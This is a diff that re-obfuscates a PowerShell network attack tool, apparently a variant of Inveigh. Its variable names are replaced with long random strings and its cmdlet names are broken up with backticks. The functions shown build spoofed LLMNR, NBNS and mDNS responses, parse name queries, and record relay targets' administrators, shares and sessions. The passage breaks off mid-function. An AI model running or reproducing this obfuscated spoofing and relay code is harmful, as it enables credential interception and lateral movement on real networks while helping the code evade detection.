+        $XbYrPODIGzmpSMdbiHUuuQjAVHjfLCwfJbYLhZeDiOF = [System.BitConverter]::ToUInt32($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[$XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG..($XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG + 3)],0)
 
-        return $UnableActor
+        return $XbYrPODIGzmpSMdbiHUuuQjAVHjfLCwfJbYLhZeDiOF
     }
 
     function Convert-DataToString
     {
-        param ([Int]$InjureNoise,[Int]$PlaceBook,[Byte[]]$IckyBloody)
+        param ([Int]$XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG,[Int]$GDrWuJgEKDiRKaJZfsVrNpYQc,[Byte[]]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE)
 
-        $DeathZephyr = [System.BitConverter]::ToString($IckyBloody[$InjureNoise..($InjureNoise + $PlaceBook - 1)])
-        $DeathZephyr = $DeathZephyr -replace "-00",""
-        $DeathZephyr = $DeathZephyr.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-        $BranchSick = ne`w-`obje`ct System.String ($DeathZephyr,0,$DeathZephyr.Length)
+        $bMZZypWfRiVCIzwTEJlZKQp = [System.BitConverter]::ToString($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE[$XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG..($XYwsDOntqdVFqECyaPTUoiVMbxehIYAvG + $GDrWuJgEKDiRKaJZfsVrNpYQc - 1)])
+        $bMZZypWfRiVCIzwTEJlZKQp = $bMZZypWfRiVCIzwTEJlZKQp -replace "-00",""
+        $bMZZypWfRiVCIzwTEJlZKQp = $bMZZypWfRiVCIzwTEJlZKQp.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+        $MfSZhwZWtaSMovqGtrauZUBFltdkpmTWzFQpsPy = ne`w`-`ob`je`ct System.String ($bMZZypWfRiVCIzwTEJlZKQp,0,$bMZZypWfRiVCIzwTEJlZKQp.Length)
 
-        return $BranchSick
+        return $MfSZhwZWtaSMovqGtrauZUBFltdkpmTWzFQpsPy
     }
 
-    function Convert-DataToUInt16($HeapShut)
+    function Convert-DataToUInt16($WRvUfEZvUzLaswvPDjydPmO)
     {
-	   [Array]::Reverse($HeapShut)
-	   return [System.BitConverter]::ToUInt16($HeapShut,0)
+	   [Array]::Reverse($WRvUfEZvUzLaswvPDjydPmO)
+	   return [System.BitConverter]::ToUInt16($WRvUfEZvUzLaswvPDjydPmO,0)
     }
 
-    function Convert-DataToUInt32($HeapShut)
+    function Convert-DataToUInt32($WRvUfEZvUzLaswvPDjydPmO)
     {
-	   [Array]::Reverse($HeapShut)
-	   return [System.BitConverter]::ToUInt32($HeapShut,0)
+	   [Array]::Reverse($WRvUfEZvUzLaswvPDjydPmO)
+	   return [System.BitConverter]::ToUInt32($WRvUfEZvUzLaswvPDjydPmO,0)
     }
 
     function Get-SpooferResponseMessage
     {
-        param ([String]$ExpectRitzy,[String]$EarBucket,[String]$IrateKneel,[String]$GustyDance,[byte]$PiesDesk)
+        param ([String]$NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK,[String]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa,[String]$ZiaZppCfoomElDsdbkRCeNmpgGF,[String]$uemMcbPkfaIvvmaKKrSfGp,[byte]$GrSMnlUYOpxqPmnvgxksnOntoUntTCzEea)
 
-        if($ExpectRitzy -like "*.*")
+        if($NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK -like "*.*")
         {
-            [Array]$VaseLick = $ExpectRitzy.Split('.')
-            $NoseSecond = $VaseLick[0]
+            [Array]$FicLqoTiXLVKTYQwUdJPIVmqpwDXCgsGeILNq = $NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK.Split('.')
+            $ssElRWeCZMgVBmNFLNGsmOAAwanSSppjrYkCddXLHdTPx = $FicLqoTiXLVKTYQwUdJPIVmqpwDXCgsGeILNq[0]
         }
 
-        $WheelBlack = "[+]"
+        $kyhHLYllDUzvQvbLEdDViOPUxFyHrFhWBAWRmWxyW = "[+]"
 
-        if($MeekSmoggy)
+        if($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn)
         {
-            $KindPale = "[inspect only]"
+            $TekHYImgYVtLMrUeuSvC = "[inspect only]"
         }
-        elseif($GustyDance -eq 'N')
+        elseif($uemMcbPkfaIvvmaKKrSfGp -eq 'N')
         {
-            $KindPale = "[spoofer disabled]"
+            $TekHYImgYVtLMrUeuSvC = "[spoofer disabled]"
         }
-        elseif($BikeLoud -and ($BikeLoud -notcontains $ExpectRitzy -and $BikeLoud -notcontains $NoseSecond))
+        elseif($EPlJedBuToZfupQVQRyNJcsGRdsiyc -and ($EPlJedBuToZfupQVQRyNJcsGRdsiyc -notcontains $NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK -and $EPlJedBuToZfupQVQRyNJcsGRdsiyc -notcontains $ssElRWeCZMgVBmNFLNGsmOAAwanSSppjrYkCddXLHdTPx))
         {
-            $KindPale = "[$ExpectRitzy not on reply list]"
+            $TekHYImgYVtLMrUeuSvC = "[$NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK not on reply list]"
         }
-        elseif($HoleRoute -contains $ExpectRitzy -or $HoleRoute -contains $NoseSecond)
+        elseif($fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo -contains $NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK -or $fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo -contains $ssElRWeCZMgVBmNFLNGsmOAAwanSSppjrYkCddXLHdTPx)
         {
-            $KindPale = "[$ExpectRitzy is on ignore list]"
+            $TekHYImgYVtLMrUeuSvC = "[$NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK is on ignore list]"
         }
-        elseif($WoozyClose -and $WoozyClose -notcontains $StuffSky)
+        elseif($swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe -and $swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe -notcontains $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd)
         {
-            $KindPale = "[$StuffSky not on reply list]"
+            $TekHYImgYVtLMrUeuSvC = "[$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd not on reply list]"
         }
-        elseif($ObeyAttack -contains $StuffSky)
+        elseif($GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg -contains $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd)
         {
-            $KindPale = "[$StuffSky is on ignore list]"
+            $TekHYImgYVtLMrUeuSvC = "[$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd is on ignore list]"
         }
-        elseif($LightOval.valid_host_list -contains $AcidDolls -and ($BikeLoud -notcontains $ExpectRitzy -and $BikeLoud -notcontains $NoseSecond))
+        elseif($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list -contains $xEJKBhWpRACOhJCfOdSJegP -and ($EPlJedBuToZfupQVQRyNJcsGRdsiyc -notcontains $NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK -and $EPlJedBuToZfupQVQRyNJcsGRdsiyc -notcontains $ssElRWeCZMgVBmNFLNGsmOAAwanSSppjrYkCddXLHdTPx))
         {
-            $KindPale = "[$AcidDolls is a valid host]"
+            $TekHYImgYVtLMrUeuSvC = "[$xEJKBhWpRACOhJCfOdSJegP is a valid host]"
         }
-        elseif($RelyNotice -eq 'Y' -and $LightOval.IP_capture_list -contains $StuffSky.IPAddressToString)
+        elseif($lzXAGMLDOOrGvWxwWmxfIHRXsfHWfGmxgFVMLvbS -eq 'Y' -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.IP_capture_list -contains $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString)
         {
-            $KindPale = "[previous $StuffSky capture]"
+            $TekHYImgYVtLMrUeuSvC = "[previous $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd capture]"
         }
-        elseif($EarBucket -eq 'NBNS' -and $StuffSky.IPAddressToString -eq $SmashDolls)
+        elseif($NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -eq 'NBNS' -and $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
         {
-            $KindPale = "[local query]"
+            $TekHYImgYVtLMrUeuSvC = "[local query]"
         }
-        elseif($PlugTour -eq 'Y' -or $SmokeFang -and $SmokeZebra.Elapsed -lt $PlantFoot)
+        elseif($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'Y' -or $TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY -and $eZFhiyEfCPrTZbJeDstfnjObk.Elapsed -lt $DxsSnFHHOmoRPsGVLmvmVz)
         {
-            $KindPale = ": " + [Int]($SmokeFang - $SmokeZebra.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
+            $TekHYImgYVtLMrUeuSvC = ": " + [Int]($TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY - $eZFhiyEfCPrTZbJeDstfnjObk.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
         }
-        elseif($EarBucket -eq 'NBNS' -and $ThawMiddle -notcontains $HealthIcy)
+        elseif($NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -eq 'NBNS' -and $XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ -notcontains $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF)
         {
-            $KindPale = "[NBNS type disabled]"
+            $TekHYImgYVtLMrUeuSvC = "[NBNS type disabled]"
         }
-        elseif($EarBucket -eq 'NBNS' -and $PiesDesk -eq 33)
+        elseif($NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -eq 'NBNS' -and $GrSMnlUYOpxqPmnvgxksnOntoUntTCzEea -eq 33)
         {
-            $KindPale = "[NBSTAT request]"
+            $TekHYImgYVtLMrUeuSvC = "[NBSTAT request]"
         }
-        elseif($BootShrill -eq 'Y' -and $EarBucket -ne 'mDNS' -and $EarBucket -ne 'DNS' -and $BattleSalt.IPAddressToString -eq $SmashDolls)
+        elseif($aIowrpuHkOxENKSShZvEwCIJzxVgFyNLYKmALixgLNWyk -eq 'Y' -and $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -ne 'mDNS' -and $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -ne 'DNS' -and $oykrKuVVEIoRCUDFEJUJvVjwnahnO.IPAddressToString -eq $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
         {
-            $KindPale = "[possible ResponderGuard request ignored]"
-            $WheelBlack = "[!]"
+            $TekHYImgYVtLMrUeuSvC = "[possible ResponderGuard request ignored]"
+            $kyhHLYllDUzvQvbLEdDViOPUxFyHrFhWBAWRmWxyW = "[!]"
         }
-        elseif($EarBucket -eq 'mDNS' -and $IrateKneel -and $WantLittle -notcontains $IrateKneel)
+        elseif($NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -eq 'mDNS' -and $ZiaZppCfoomElDsdbkRCeNmpgGF -and $oiEknJevzfgMBjSqYIpc -notcontains $ZiaZppCfoomElDsdbkRCeNmpgGF)
         {
-            $KindPale = "[mDNS type disabled]"
+            $TekHYImgYVtLMrUeuSvC = "[mDNS type disabled]"
         }
-        elseif($EarBucket -ne 'mDNS' -and $EarBucket -ne 'DNS' -and $OwnBump -gt 0 -and @($LightOval.request_table.$ExpectRitzy | Where-Object {$_ -match $StuffSky.IPAddressToString}).Count -le $OwnBump)
+        elseif($NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -ne 'mDNS' -and $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -ne 'DNS' -and $wDCFDGIoGZceCUiHjkwAZDQXJJNKhHkWrGexcePVDeWCz -gt 0 -and @($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK | Where-Object {$_ -match $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString}).Count -le $wDCFDGIoGZceCUiHjkwAZDQXJJNKhHkWrGexcePVDeWCz)
         {
-            $KindPale = "[SpooferThresholdHost >= $(@($LightOval.request_table.$ExpectRitzy | Where-Object {$_ -match $StuffSky.IPAddressToString}).Count)]"
+            $TekHYImgYVtLMrUeuSvC = "[SpooferThresholdHost >= $(@($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK | Where-Object {$_ -match $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString}).Count)]"
         }
-        elseif($EarBucket -ne 'mDNS' -and $EarBucket -ne 'DNS' -and $SameSneaky -gt 0 -and @($LightOval.request_table.$ExpectRitzy | Sort-Object | Get-Unique).Count -le $SameSneaky)
+        elseif($NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -ne 'mDNS' -and $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -ne 'DNS' -and $DdjubLRjwAypaYSppdSjdNWWgjtwdcxUchRdcyC -gt 0 -and @($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK | Sort-Object | Get-Unique).Count -le $DdjubLRjwAypaYSppdSjdNWWgjtwdcxUchRdcyC)
         {
-            $KindPale = "[SpooferThresholdNetwork >= $(@($LightOval.request_table.$ExpectRitzy | Sort-Object | Get-Unique).Count)]"
+            $TekHYImgYVtLMrUeuSvC = "[SpooferThresholdNetwork >= $(@($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK | Sort-Object | Get-Unique).Count)]"
         }
-        elseif($ExpectRitzy -match '[^\x00-\x7F]+')
+        elseif($NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK -match '[^\x00-\x7F]+')
         {
-            $KindPale = "[nonprintable characters]"
+            $TekHYImgYVtLMrUeuSvC = "[nonprintable characters]"
         }
         else
         {
-            $KindPale = "[response sent]"
+            $TekHYImgYVtLMrUeuSvC = "[response sent]"
         }
 
-        return $WheelBlack,$KindPale
+        return $kyhHLYllDUzvQvbLEdDViOPUxFyHrFhWBAWRmWxyW,$TekHYImgYVtLMrUeuSvC
     }
 
-    function Get-NeedleSoak([String]$NeedleSoak)
+    function Get-ZsFNylZKZDXPRaRNjAMJ([String]$ZsFNylZKZDXPRaRNjAMJ)
     {
 
-        switch ($NeedleSoak)
+        switch ($ZsFNylZKZDXPRaRNjAMJ)
         {
 
             '41-41'
             {
-                $HealthIcy = "00"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "00"
             }
 
             '41-42'
             {
-                $HealthIcy = "01"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "01"
             }
 
             '41-43'
             {
-                $HealthIcy = "02"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "02"
             }
 
             '41-44'
             {
-                $HealthIcy = "03"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "03"
             }
 
             '43-41'
             {
-                $HealthIcy = "20"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "20"
             }
 
             '42-4C'
             {
-                $HealthIcy = "1B"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "1B"
             }
 
             '42-4D'
             {
-                $HealthIcy = "1C"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "1C"
             }
 
             '42-4E'
             {
-                $HealthIcy = "1D"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "1D"
             }
 
             '42-4F'
             {
-                $HealthIcy = "1E"
+                $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF = "1E"
             }
 
         }
 
-        return $HealthIcy
+        return $VRLlYeDygtnRNRarnhXNWcaUvYWHLPBDHMzSNF
     }
 
-    function Get-NameQueryString([Int]$ElatedCent, [Byte[]]$NameQuery)
+    function Get-NameQueryString([Int]$anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF, [Byte[]]$NameQuery)
     {
-        $BouncyPlucky = $NameQuery[12]
+        $YoQeXzrTGkxyXOfXWPSCBjubLpmdjvYLbSBz = $NameQuery[12]
 
-        if($BouncyPlucky -gt 0)
+        if($YoQeXzrTGkxyXOfXWPSCBjubLpmdjvYLbSBz -gt 0)
         {
-            $ColorReply = 0
+            $vfvDllDKJdYKKWFSzYEB = 0
             $name_query_string = ''
 
             do
             {
-                $name_query_string += [System.Text.Encoding]::UTF8.GetString($NameQuery[($ElatedCent + 1)..($ElatedCent + $BouncyPlucky)])
-                $ElatedCent += $BouncyPlucky + 1
-                $BouncyPlucky = $NameQuery[$ElatedCent]
-                $ColorReply++
+                $name_query_string += [System.Text.Encoding]::UTF8.GetString($NameQuery[($anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF + 1)..($anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF + $YoQeXzrTGkxyXOfXWPSCBjubLpmdjvYLbSBz)])
+                $anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF += $YoQeXzrTGkxyXOfXWPSCBjubLpmdjvYLbSBz + 1
+                $YoQeXzrTGkxyXOfXWPSCBjubLpmdjvYLbSBz = $NameQuery[$anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF]
+                $vfvDllDKJdYKKWFSzYEB++
 
-                if($BouncyPlucky -gt 0)
+                if($YoQeXzrTGkxyXOfXWPSCBjubLpmdjvYLbSBz -gt 0)
                 {
                     $name_query_string += "."
                 }
 
             }
-            until($BouncyPlucky -eq 0 -or $ColorReply -eq 127)
+            until($YoQeXzrTGkxyXOfXWPSCBjubLpmdjvYLbSBz -eq 0 -or $vfvDllDKJdYKKWFSzYEB -eq 127)
             
         }
 
@@ -1487,11 +1487,11 @@ $LivelySqueak =
 
     function ConvertFrom-PacketOrderedDictionary
     {
-        param($AjarMix)
+        param($dmBEqeyfRfgGEdKvOuta)
 
-        foreach($HeapShut in $AjarMix.Values)
+        foreach($WRvUfEZvUzLaswvPDjydPmO in $dmBEqeyfRfgGEdKvOuta.Values)
         {
-            $byte_array += $HeapShut
+            $byte_array += $WRvUfEZvUzLaswvPDjydPmO
         }
 
         return $byte_array
@@ -1499,100 +1499,100 @@ $LivelySqueak =
 
     function New-RelayEnumObject
     {
-        param ($SmashDolls,$OrderSteam,$RainyShave,$ItchyDusty,$FryHarbor,$MurderYummy,$GaudyWait,$RusticCare,$UniteDuck,
-        $StiffFull,$RelyTawdry,$MeddleBruise,$TeenySound,$PloughBouncy,$FoldDam,$HeadyCan)
+        param ($vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS,$eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp,$JRPFnfKvazFOZaFuyEmuboVRJBxuGr,$BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl,$kZcyxyMFZEBSRHzWZjWFgLJXVOMmU,$vMPvElOJetANKWCKrChLiuOdyKoPuQLg,$hXygLeAhoqHQwktERyCUkslpzyJANghWi,$SeleSfRovESeYZJOAGuokHiOGM,$sILfARgQqpeIsUnaYFklNaJGxjx,
+        $gyrcNQfHmPtETsiLSPpL,$hNfwGGMlyxsOIgcKnLsZVkJOwjrxtAlYAY,$ecBRzWXbonhLnPjRRzQtqGY,$EkCnVqzfIzCmzUWuZxrJRdsJ,$QBqvEffPgGPOTcwIikibuuM,$pcAjVRUHdxmzxrQcKuVZM,$FfTzgqVmMbfKBpJqdxlsKoN)
 
-        if($RainyShave -and $RainyShave -isnot [Array]){$RainyShave = @($RainyShave)}
-        if($ItchyDusty -and $ItchyDusty -isnot [Array]){$ItchyDusty = @($ItchyDusty)}
-        if($FryHarbor -and $FryHarbor -isnot [Array]){$FryHarbor = @($FryHarbor)}
-        if($MurderYummy -and $MurderYummy -isnot [Array]){$MurderYummy = @($MurderYummy)}
-        if($GaudyWait -and $GaudyWait -isnot [Array]){$GaudyWait = @($GaudyWait)}
-        if($RusticCare -and $RusticCare -isnot [Array]){$RusticCare = @($RusticCare)}
-        if($UniteDuck -and $UniteDuck -isnot [Array]){$UniteDuck = @($UniteDuck)}
-        if($StiffFull -and $StiffFull -isnot [Array]){$StiffFull = @($StiffFull)}
+        if($JRPFnfKvazFOZaFuyEmuboVRJBxuGr -and $JRPFnfKvazFOZaFuyEmuboVRJBxuGr -isnot [Array]){$JRPFnfKvazFOZaFuyEmuboVRJBxuGr = @($JRPFnfKvazFOZaFuyEmuboVRJBxuGr)}
+        if($BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl -and $BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl -isnot [Array]){$BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl = @($BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl)}
+        if($kZcyxyMFZEBSRHzWZjWFgLJXVOMmU -and $kZcyxyMFZEBSRHzWZjWFgLJXVOMmU -isnot [Array]){$kZcyxyMFZEBSRHzWZjWFgLJXVOMmU = @($kZcyxyMFZEBSRHzWZjWFgLJXVOMmU)}
+        if($vMPvElOJetANKWCKrChLiuOdyKoPuQLg -and $vMPvElOJetANKWCKrChLiuOdyKoPuQLg -isnot [Array]){$vMPvElOJetANKWCKrChLiuOdyKoPuQLg = @($vMPvElOJetANKWCKrChLiuOdyKoPuQLg)}
+        if($hXygLeAhoqHQwktERyCUkslpzyJANghWi -and $hXygLeAhoqHQwktERyCUkslpzyJANghWi -isnot [Array]){$hXygLeAhoqHQwktERyCUkslpzyJANghWi = @($hXygLeAhoqHQwktERyCUkslpzyJANghWi)}
+        if($SeleSfRovESeYZJOAGuokHiOGM -and $SeleSfRovESeYZJOAGuokHiOGM -isnot [Array]){$SeleSfRovESeYZJOAGuokHiOGM = @($SeleSfRovESeYZJOAGuokHiOGM)}
+        if($sILfARgQqpeIsUnaYFklNaJGxjx -and $sILfARgQqpeIsUnaYFklNaJGxjx -isnot [Array]){$sILfARgQqpeIsUnaYFklNaJGxjx = @($sILfARgQqpeIsUnaYFklNaJGxjx)}
+        if($gyrcNQfHmPtETsiLSPpL -and $gyrcNQfHmPtETsiLSPpL -isnot [Array]){$gyrcNQfHmPtETsiLSPpL = @($gyrcNQfHmPtETsiLSPpL)}
 
-        $AllowDebt = ne`w-`obje`ct PSObject
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Index" $LightOval.enumerate.Count
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "IP" $SmashDolls
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Hostname" $OrderSteam
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Sessions" $RainyShave
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Users" $ItchyDusty
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Administrator Groups" $FryHarbor
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Privileged" $MurderYummy
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Shares" $GaudyWait
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions" $RusticCare
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "NetSessions Mapped" $UniteDuck
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Local Users" $StiffFull
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB2.1" $RelyTawdry
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Signing" $MeddleBruise
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "SMB Server" $TeenySound
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Targeted" $PloughBouncy
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Enumerate" $RiverErect
-        Add-Member -InputObject $AllowDebt -MemberType NoteProperty -Name "Execute" $ZipKey
+        $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl = ne`w`-`ob`je`ct PSObject
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Index" $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate.Count
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "IP" $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Hostname" $eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Sessions" $JRPFnfKvazFOZaFuyEmuboVRJBxuGr
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Administrator Users" $BpvvaEolPfqyLSduKBoFjZFrQPUMCWgPeNWsUHezbDKvl
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Administrator Groups" $kZcyxyMFZEBSRHzWZjWFgLJXVOMmU
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Privileged" $vMPvElOJetANKWCKrChLiuOdyKoPuQLg
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Shares" $hXygLeAhoqHQwktERyCUkslpzyJANghWi
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "NetSessions" $SeleSfRovESeYZJOAGuokHiOGM
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "NetSessions Mapped" $sILfARgQqpeIsUnaYFklNaJGxjx
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Local Users" $gyrcNQfHmPtETsiLSPpL
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "SMB2.1" $hNfwGGMlyxsOIgcKnLsZVkJOwjrxtAlYAY
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Signing" $ecBRzWXbonhLnPjRRzQtqGY
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "SMB Server" $EkCnVqzfIzCmzUWuZxrJRdsJ
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Targeted" $QBqvEffPgGPOTcwIikibuuM
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Enumerate" $WsipaoDmmOZihqBiuKHoBQcyVQziHECAJrZmRIBwGQfZY
+        Add-Member -InputObject $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl -MemberType NoteProperty -Name "Execute" $viWdgvNYkOzODzwDtvGSpucfykSfKBbcyfgWdBE
 
-        return $AllowDebt
+        return $xvtnvfAaYmQoeyjhcrWtJIlGfNZhJWTIESuOl
     }
 
     function Invoke-SessionUpdate
     {
-        param ([String]$DesireUnique,[String]$StuffDark,[String]$OrderSteam,[String]$SmashDolls)
+        param ([String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,[String]$MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf,[String]$eRGbKjnZUhrTKuiBJynaeNWyTRyZVMwVtclTp,[String]$vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
 
-        if($LightOval.domain_mapping_table.$DesireUnique)
+        if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay)
         {
-            $RejectFast = ($StuffDark + "@" + $LightOval.domain_mapping_table.$DesireUnique).ToUpper()
-            $LoveEggs = ($OrderSteam + "." + $LightOval.domain_mapping_table.$DesireUnique).ToUpper()
